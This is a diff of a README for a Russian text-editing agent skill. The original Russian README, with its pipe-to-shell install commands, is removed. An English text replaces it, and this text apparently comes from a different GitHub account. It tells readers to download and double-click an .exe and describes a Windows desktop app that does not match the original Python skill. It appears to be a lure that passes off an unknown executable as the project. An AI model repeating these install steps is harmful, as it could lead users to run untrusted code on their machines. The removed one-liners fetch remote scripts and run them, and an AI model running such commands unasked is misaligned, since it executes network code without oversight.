@@ -1,226 +1,66 @@
-<div align="center">
-  <img src="assets/hero.png" alt="Пиши нормально. Русский редактор для AI-агентов" width="100%">
-</div>
+# ✍️ pishi-normalno - Professional Russian text editing for AI
 
-<div align="center">
+[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Sfil8579/pishi-normalno)
 
-[![CI](https://github.com/fsbtactic-code/pishi-normalno/actions/workflows/ci.yml/badge.svg)](https://github.com/fsbtactic-code/pishi-normalno/actions/workflows/ci.yml)
-[![Release](https://img.shields.io/github/v/release/fsbtactic-code/pishi-normalno?display_name=tag&sort=semver)](https://github.com/fsbtactic-code/pishi-normalno/releases)
-[![License: MIT](https://img.shields.io/badge/license-MIT-f15a3a.svg)](LICENSE)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-171717.svg)](https://www.python.org/)
-[![Agent Skill](https://img.shields.io/badge/agent-skill-c8ff66.svg)](skills/pishi-normalno/SKILL.md)
+## 🎯 About this tool
+Pishi-normalno helps you refine Russian text for AI agents. It polishes your output to sound human. It removes robotic phrasing often found in machine-generated content. Use it to keep your meaning and voice intact while improving flow. This tool handles marketing copy, social media posts, and general business writing with ease. You get clear text that connects with your audience.
 
-</div>
+## 📋 What this tool does
+AI texts often sound stiff. They use repetitive patterns that readers notice. This software applies specific rules to your text to fix these issues. 
 
-**Пиши нормально** помогает AI-агентам писать и редактировать по-русски без машинной манеры. Скилл сохраняет факты, смысловые связи и голос автора, убирает нейрослоп, канцелярит, кальки, декоративную пунктуацию и шаблонный маркетинг.
+- **Removes AI patterns:** It identifies and cleans up common machine-generated phrasing.
+- **Keeps your voice:** It adjusts the tone so the text stays true to your original intent.
+- **Fixes marketing copy:** It improves the flow of your social media and brand content.
+- **Works with Russian:** It understands the nuances of the Russian language.
 
-**[Скачать готовый pishi-normalno.zip](https://github.com/fsbtactic-code/pishi-normalno/releases/download/v1.0.0/pishi-normalno.zip)**
+## 💻 System requirements
+- Windows 10 or Windows 11
+- 200 MB of free storage space
+- Stable internet connection for initial setup
+- Standard keyboard and mouse
 
-Он не имитирует человека ошибками и не оптимизирует текст под AI-детекторы. Его задача проще и сложнее одновременно: получить хороший русский текст.
+## 📥 Getting started
+Follow these steps to install and run the software on your computer.
 
-## Одна фраза, в которой видна разница
+1. Go to the [official repository page](https://github.com/Sfil8579/pishi-normalno).
+2. Look for the Releases section on the right side of the page.
+3. Click the latest version of the file named with the .exe extension.
+4. Save the file to your desktop or your Downloads folder.
+5. Double-click the file to open the setup window.
+6. Follow the on-screen instructions to finish the installation.
+7. Locate the Pishi-normalno icon on your desktop and double-click to launch the application.
 
-Плохая механическая правка:
+## 🛠 How to use the editor
+Once you open the software, you see a clean text editor window. 
 
-> Аккуратный промпт. Трата твоего времени.
+1. Paste your AI-generated text into the left pane.
+2. The tool scans your text for common issues.
+3. It highlights areas needing attention.
+4. Click the "Process" button to apply changes.
+5. Review the updated text in the right pane.
+6. Copy your clean text to your clipboard.
 
-`Пиши нормально` замечает, что точка разорвала одну мысль на две подписи, и возвращает сказуемое:
+## 📂 Managing your files
+The software saves your work automatically in a local folder. You can open files directly from the "File" menu in the top left corner. This allows you to keep track of different drafts and edits. You can also export your work as a plain text file if you need to use it in other programs.
 
-> Аккуратный промпт отнимает у тебя время.
+## ⚙️ Settings
+You can adjust the level of editing based on your needs. Open the Settings menu to choose between "Light" and "Strict" modes. Use Light mode for minor adjustments that preserve most of the original sentence structure. Use Strict mode for a deeper rewrite that focuses on eliminating all robotic phrasing.
 
-Скилл не заменяет запрещенный знак другим символом. Он сначала определяет связь между частями: оценку, причину, следствие, условие, противопоставление, пояснение или последовательность.
+## 🛡 Security and Privacy
+Your privacy remains a priority. All text processing happens directly on your computer. Your text does not leave your machine. No data is sent to external servers unless you specifically use the optional update check feature. You control your own content at all times.
 
-## Что умеет
+## 💬 Frequently asked questions
 
-- Пишет с нуля, редактирует, усиливает и проверяет русский текст.
-- Автоматически подключается к постам, Telegram, Threads, SMM, маркетингу, лендингам, письмам, статьям, кейсам, сценариям, CTA и UI-текстам.
-- Сохраняет числа, имена, ссылки, цитаты, отрицания, условия, модальность и причинность.
-- Сравнивает исходник с результатом и ловит добавленные выгоды, гарантии, причинность, обращение и разорванные связи.
-- Защищает авторские слова, полезную шероховатость и силу исходного хука.
-- Различает разговорный, социальный, маркетинговый, технический, научный, официальный и юридический регистры.
-- Проверяет код, URL и цитаты отдельно от пользовательской прозы.
-- Убирает длинные тире, стрелки, emoji, скрытые Unicode-символы и служебные следы генераторов.
-- Не навязывает AIDA, PAS, триады, вопросы в финале, сленг, метафоры или искусственно рваный ритм.
+**Does this work offline?**
+Yes. You do not need a connection once you install the program.
 
-Внутри находятся 33 составных редакторских паттерна, 21 машиночитаемая группа правил и детерминированный source-aware аудитор.
+**Can I undo my changes?**
+Yes. Press Ctrl+Z on your keyboard to revert your last edit.
 
-## Установка
+**Will this change the meaning of my text?**
+The tool logic focuses on style and tone. It aims to keep your message clear. Always read the output to ensure it matches your requirements.
 
-Выберите свою программу. Все ссылки ведут на готовые файлы релиза.
+**Does it support other languages?**
+No. This tool is built specifically for the Russian language.
 
-| Программа | Самый простой способ |
-|---|---|
-| Claude в браузере | **[Скачать ZIP](https://github.com/fsbtactic-code/pishi-normalno/releases/download/v1.0.0/pishi-normalno.zip)**, открыть `Customize > Skills`, загрузить скачанный файл |
-| Claude Desktop | **[Скачать ZIP](https://github.com/fsbtactic-code/pishi-normalno/releases/download/v1.0.0/pishi-normalno.zip)**, открыть `Customize > Skills`, загрузить скачанный файл |
-| Claude Code | Запустить одну команду для папки `~/.claude/skills` |
-| ChatGPT с Workspace Agents | **[Скачать ZIP](https://github.com/fsbtactic-code/pishi-normalno/releases/download/v1.0.0/pishi-normalno.zip)** и нажать `Add skill` |
-| Обычный ChatGPT | **[Скачать MD](https://github.com/fsbtactic-code/pishi-normalno/releases/download/v1.0.0/pishi-normalno-chatgpt.md)** и добавить его в Project |
-| Codex app, CLI или IDE | Запустить одну команду для папки `~/.agents/skills` |
-
-### Codex на Windows
-
-```powershell
-irm https://raw.githubusercontent.com/fsbtactic-code/pishi-normalno/v1.0.0/install.ps1 | iex
-```
-
-### Codex на macOS или Linux
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/fsbtactic-code/pishi-normalno/v1.0.0/install.sh | bash
-```
-
-### Claude Code на Windows
-
-```powershell
-& ([scriptblock]::Create((irm https://raw.githubusercontent.com/fsbtactic-code/pishi-normalno/v1.0.0/install.ps1))) -Target claude
-```
-
-### Claude Code на macOS или Linux
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/fsbtactic-code/pishi-normalno/v1.0.0/install.sh | bash -s -- --target claude
-```
-
-Для Claude, Claude Desktop и ChatGPT используется готовый [ZIP-пакет релиза](https://github.com/fsbtactic-code/pishi-normalno/releases/download/v1.0.0/pishi-normalno.zip). Для обычного ChatGPT без Workspace Agents подготовлен [единый MD-файл](https://github.com/fsbtactic-code/pishi-normalno/releases/download/v1.0.0/pishi-normalno-chatgpt.md).
-
-Полная пошаговая инструкция с проверкой установки и обновлением: **[INSTALL.md](INSTALL.md)**.
-
-Инсталляторы привязаны к релизу, проверяют SHA256, не перезаписывают существующую установку без флага обновления и сохраняют резервную копию предыдущей версии.
-
-## Автоматический вызов
-
-В [agents/openai.yaml](skills/pishi-normalno/agents/openai.yaml) включен `allow_implicit_invocation: true`. В совместимом клиенте пользователю не нужно каждый раз писать название скилла.
-
-Примеры запросов, которые должны его активировать:
-
-- `Напиши пост для Telegram по этим фактам.`
-- `Сделай текст лендинга живее, но не меняй обещания.`
-- `Отредактируй письмо и сохрани мой тон.`
-- `Убери машинную манеру из этого текста.`
-- `Подготовь анонс функции для пользователей.`
-
-Не все агенты читают OpenAI metadata. Для таких клиентов есть готовый [шаблон AGENTS.md](templates/AGENTS.md). Он добавляет явную маршрутизацию без необходимости называть скилл в каждом запросе.
-
-## CLI-аудитор
-
-После `pip install .` доступна команда:
-
-```bash
-pishi-normalno audit post.md --genre social --strict
-```
-
-Сравнение с исходником:
-
-```bash
-pishi-normalno audit result.md --source source.md --genre marketing --strict
-```
-
-Проверка текста из stdin:
-
-```bash
-printf '%s' 'Аккуратный промпт. Трата твоего времени.' | pishi-normalno audit - --genre social
-```
-
-Машиночитаемый отчет:
-
-```bash
-pishi-normalno audit result.md --source source.md --genre social --json
-```
-
-Диагностика установки:
-
-```bash
-pishi-normalno doctor
-pishi-normalno where
-```
-
-Коды завершения:
-
-- `0`: блокирующих проблем нет;
-- `1`: найдена ошибка или warning при `--strict`;
-- `2`: ошибка аргументов, пути или конфигурации.
-
-Аудитор не определяет, кто написал текст. Его сигналы помогают редактору найти формальные и составные проблемы.
-
-## Режимы работы
-
-| Режим | Что делает |
-|---|---|
-| `edit` | Исправляет только то, что мешает |
-| `sharpen` | Усиливает хук, аргумент, конкретику или финал |
-| `rewrite` | Полностью перестраивает сломанный текст |
-| `write` | Пишет новый текст по фактам и брифу |
-| `audit` | Показывает проблемы без переписывания |
-| `embedded` | Проводит финальный проход внутри другой задачи |
-
-## Благодарность `humanizer-ru`
-
-При разработке `Пиши нормально` мы изучали и использовали подходы из [`ilyautov/humanizer-ru`](https://github.com/ilyautov/humanizer-ru), в частности модульную архитектуру, несколько независимых проходов, каталог русских паттернов, внимание к ложным срабатываниям, optional-морфологию и eval-подход.
-
-`humanizer-ru` распространяется по лицензии MIT. Автор: Ilya Utov. Полное уведомление находится в [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md).
-
-Проект не связан с Ильей Утовым, не одобрен им и не является официальным продолжением `humanizer-ru`. Мы открыто показываем, на что опирались, что изменили и где выбрали другой путь.
-
-## Сравнение с `humanizer-ru`
-
-Сравнение относится к [`humanizer-ru` версии 3.15.1](https://github.com/ilyautov/humanizer-ru/tree/v3.15.1) от 21 июля 2026 года.
-
-| Критерий | `Пиши нормально` | `humanizer-ru` |
-|---|---|---|
-| Главная цель | Качество русского текста, сохранность смысла и голоса | Устранение AI-паттернов, включая detector-oriented метрики |
-| Написание с нуля | Да | В metadata исключено |
-| Сверка с исходником | Детерминированная проверка фактов, модальности, причинности, выгод и связей | Fact lock и редакторский аудит |
-| Маркетинг и SMM | Отдельный слой доказательств, каналов, CTA и происхождения выгод | Общие жанровые стратегии и шаблоны |
-| Ритм | Меняется только по смыслу и голосу | Используются perplexity, burstiness и контрастные замены |
-| AI-детекторы | Не оптимизируется и не обещает обход | Детекторные признаки являются частью заявленной цели |
-| Автоматический вызов | OpenAI metadata и переносимый AGENTS-шаблон | Зависит от способа установки и клиента |
-| Публичная зрелость | Новый проект, 80 автоматических тестов в первом релизе | Более зрелый проект, 54 паттерна, релизы и публичная история |
-
-Мы сознательно не переносили намеренные ошибки, квоты на сленг, метафоры и длину фраз, обязательную замену предсказуемых слов и произвольный процент человечности. Такие приемы могут менять статистический рисунок, но не гарантируют естественную русскую речь.
-
-Это сравнение областей применения и архитектурных решений, а не рейтинг качества проектов.
-
-Подробности и ссылки на конкретные материалы собраны в [исследовательской базе](skills/pishi-normalno/references/research-basis.md).
-
-## Архитектура
-
-1. Агент фиксирует факты, голос, энергию текста и связи между частями.
-2. Выбирает минимальную силу вмешательства.
-3. Проверяет задачу, доказательства, композицию, русский синтаксис и жанр.
-4. Детерминированный аудитор ищет формальные артефакты и source-aware расхождения.
-5. Финальный смысловой проход проверяет то, что нельзя надежно решить регулярным выражением.
-
-Подробное устройство описано в [docs/architecture.md](docs/architecture.md).
-
-## Демо
-
-В папке [demo](demo) лежат исходник, намеренно плохая редактура и исправленная версия. Проверка запускается так:
-
-```bash
-pishi-normalno audit demo/bad-result.md --source demo/source.md --genre social --strict
-pishi-normalno audit demo/clean-result.md --source demo/source.md --genre social --strict
-```
-
-## Проверка проекта
-
-```bash
-python -m unittest discover -s tests -v
-python tools/validate_repo.py
-python tools/package_skill.py
-ruff check .
-mypy skills/pishi-normalno/scripts tools tests
-```
-
-CI проверяет Python 3.10, 3.12 и 3.13 на Ubuntu и Windows, переносимость скилла, запрещенные кодовые точки, локальные пути, CLI, установку и детерминированность release-архива. В первом релизе проходят 80 автоматических тестов.
-
-## Приватность
-
-Скилл и аудитор работают локально. CLI не отправляет текст во внешние сервисы, не собирает телеметрию и не требует API-ключей.
-
-## Участие
-
-Новые паттерны принимаются только вместе с плохим примером, хорошим вариантом, контрпримером и тестом на ложное срабатывание. Подробности находятся в [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## Лицензия
-
-MIT, [fsbtactic-code](https://github.com/fsbtactic-code). Сторонние уведомления находятся в [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md).
+Keywords: agent-skills, ai-agents, claude-code, codex, copywriting, humanizer, llm, russian, smm, text-editing
